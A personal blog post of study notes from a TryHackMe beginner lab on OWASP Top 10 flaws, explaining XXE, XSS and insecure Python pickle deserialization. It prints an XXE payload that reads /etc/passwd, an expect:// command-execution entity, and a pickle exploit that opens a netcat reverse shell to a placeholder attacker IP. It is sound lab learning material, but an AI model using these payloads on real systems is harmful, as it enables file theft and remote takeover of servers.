@@ -1,0 +1,103 @@
+---
+title: 'TryHackMe: Complete Beginner'
+date: 2021-10-06 05:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2021-10-06-tryhackme-complete-beginner.html
+author: 100007
+---
+
+<h1 id="tryhackme-complete-beginner">TryHackMe: Complete Beginner</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2021-10-06</p>
+<h2 id="owasp-top-10">OWASP Top 10</h2>
+<h3 id="severity-04-xml-external-entity">(Severity 04) XML External Entity</h3>
+<p>As with injection attacks, XML external entity (XXE) attacks are broken down into two types: in-band (analogous us to active injection attacks) and out-of-band (OOB-XXE or “blind” XXE, which are of course analogous to blind injection attacks).</p>
+<p>The encoding/version bit of an XML document is called the “prolog”.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</code></pre></div></div>
+<p>Also, there is one and only one root element in an XML document. And XML is case-sensitive. Whee!</p>
+<p>DTDs look very XML-like themselves. Using the actual example from TryHackMe, this DTD:</p>
+<pre><code class="language-dtd">&lt;!DOCTYPE note [
+&lt;!ELEMENT note (to, from, heading, body)&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;
+&lt;!ELEMENT heading (#PCDATA)&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;
+]&gt;
+</code></pre>
+<p>Defines this XML:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE note SYSTEM "note.dtd"&gt;</span>
+<span class="nt">&lt;note&gt;</span>
+<span class="nt">&lt;to&gt;</span>foo<span class="nt">&lt;/to&gt;</span>
+<span class="nt">&lt;from&gt;</span>bar<span class="nt">&lt;/from&gt;</span>
+<span class="nt">&lt;heading&gt;</span>baz<span class="nt">&lt;/heading&gt;</span>
+<span class="nt">&lt;body&gt;</span>etc.<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/note&gt;</span>
+</code></pre></div></div>
+<p>(<code class="language-plaintext highlighter-rouge">#PCDATA</code> indicates “parsable character data” — an XML-encoded string.)</p>
+<p>There are three basic important XML bits here:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">!DOCTYPE</code> defines the document type <em>and</em> the root element.</li>
+<li><code class="language-plaintext highlighter-rouge">!ELEMENT</code> defines additional elements (so if I understand this correctly, a !DOCTYPE declaration must contain at least one !ELEMENT with the same name).</li>
+<li><code class="language-plaintext highlighter-rouge">!ENTITY</code> defines entities like <code class="language-plaintext highlighter-rouge">&amp;gt;</code> — basically shortcuts for other data. There seems to be a lot more to XML entities than just this though…</li>
+</ul>
+<p>The SYSTEM keyword can be included in !ENTITY declarations (or in the XML document !DOCTYPE declaration), and means “read this from the current system”.</p>
+<p>Basically, you can think of the bit between the brackets (<code class="language-plaintext highlighter-rouge">[]</code>) in the DTD as getting slotted into the URI specifying the DTD in the XML !DOCTYPE. In fact, we can insert additional document type definitions into the end of a !DOCTYPE statement in this way; combining this with the SYSTEM declaration can allow us to read any files the webserver has access to.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY read SYSTEM "file:///etc/passwd"&gt;</span>]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;read;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>This basically strikes me as more-or-less the same thing as an injection attack, just that we’re targeting the XML parser rather than the website code.</p>
+<p>RCE through XEE is apparently rare, but can be achieved via the PHP expect module.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY xxerce SYSTEM "expect://id"&gt;</span>]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;xxerce;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre></div></div>
+<p>It looks like this is something that would be more commonly attacked over an API than directly through a web front-end.</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/log/2021-10-05-tryhackme-complete-beginner.html">2021-10-05 - TryHackMe: Complete Beginner</a></li>
+<li><a href="https://xmlwriter.net/xml_guide/entity_declaration.shtml">ENTITY Declaration</a></li>
+<li><a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection">Exploitation: XML External Entity (XXE) Injection</a></li>
+</ul>
+<h3 id="severity-06-security-misconfiguration">(Severity 06) Security Misconfiguration</h3>
+<p>Basically, this about the use of defaults or bad configurations of existing security controls, whereas “broken access control” (which didn’t really include anything worth noting explicitly) is about missing or non-functional controls.</p>
+<h3 id="severity-07-cross-site-scripting">(Severity 07) Cross-Site Scripting</h3>
+<p>Three varieties:</p>
+<ul>
+<li>Stored XSS (saved to the website database)</li>
+<li>Reflected XSS (included in the user request, for example via a malicious link)</li>
+<li><a href="https://owasp.org/www-community/Types_of_Cross-Site_Scripting#DOM_Based_XSS_.28AKA_Type-0.29">DOM-Based XSS</a> (a little unclear what this is, but it looks like it’s basically similar to a reflection attack except that everything happens client-side)</li>
+</ul>
+<p><a href="http://www.xss-payloads.com/">XSS-Payloads is a library of potentially useful XSS tools.</a></p>
+<p>Mostly, this is about injecting <code class="language-plaintext highlighter-rouge">&lt;script/&gt;</code> tags.</p>
+<h3 id="severity-08-insecure-deserialization">(Severity 08) Insecure Deserialization</h3>
+<p>Basically, this is about trusting user-provided input to determine state.</p>
+<p>On the low end, this can be something like using a cookie to determine user privileges.</p>
+<p>But on the high end, if the application is actually <em>executing</em> data provided by the user <em>as code</em>.</p>
+<p>So what’s the difference between this and injection? (As far as I can tell) In command injection we’re abusing an existing function to get the web application to run a command (system, SQL, whatever) for us, while insecure deserialization is specifically about manipulating the internal state of the application (which can include the before-mentioned data-as-code trick).</p>
+<p>Where the name of this vulnerability starts to make more sense is when the application is encoding (serializing) objects or other data structures, storing them on the user side, and then decoding (deserializing) the structure at a later time and using / trusting it without further checks.</p>
+<p>In the TryHackMe example we’re attacking the Python pickle.loads() operation, which reconstructs objects from an encoded data stream. When an object is reconstructed it is actually fully initialized, which means that things like <code class="language-plaintext highlighter-rouge">object.__reduce__()</code> are run.</p>
+<p><a href="https://davidhamann.de/2020/04/05/exploiting-python-pickle/">This post is much clearer than TryHackMe when it comes to explaining how we’re attacking pickle.loads().</a></p>
+<p>Anyways, the TryHackMe room has us use the following code to create a malicious base64 encoded object to feed pickle.loads() (YOUR_TRYHACKME_VPN_IP gets replaced by your VPN IP):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="n">command</span> <span class="o">=</span> <span class="s">'rm /tmp/f; '</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">'mkfifo /tmp/f; '</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">'cat /tmp/f | '</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">'/bin/sh -i 2&gt;&amp;1 | '</span>
+<span class="n">command</span> <span class="o">+=</span> <span class="s">'netcat YOUR_TRYHACKME_VPN_IP 4444 &gt; /tmp/f'</span>
+<span class="k">class</span> <span class="nc">rce</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">,(</span><span class="n">command</span><span class="p">,))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">rce</span><span class="p">())))</span>
+</code></pre></div></div>
+<p>What’s getting encoded here is the <code class="language-plaintext highlighter-rouge">rce</code> class. Python will call <code class="language-plaintext highlighter-rouge">rce.__reduce__()</code> to determine how to initialize this class when pickle.loads() deserializes it, and <code class="language-plaintext highlighter-rouge">__reduce__()</code> wil return the tuple <code class="language-plaintext highlighter-rouge">(os.system, (command,))</code>, where <code class="language-plaintext highlighter-rouge">command</code> is basically our standard Metasploit reverse shell. Python then initializes the class by using os.system to call <code class="language-plaintext highlighter-rouge">command</code>, and there’s our reverse shell!</p>
+<p>(SIDE NOTE: Isn’t <code class="language-plaintext highlighter-rouge">nc</code> a more common name for <code class="language-plaintext highlighter-rouge">netcat</code>? Debian provides links to both in /etc/aleternatives, but it seems best not to assume we’re on a Debian system…)</p>
+<ul>
+<li><a href="https://docs.python.org/3/library/pickle.html">pickle — Python object serialization</a></li>
+</ul>
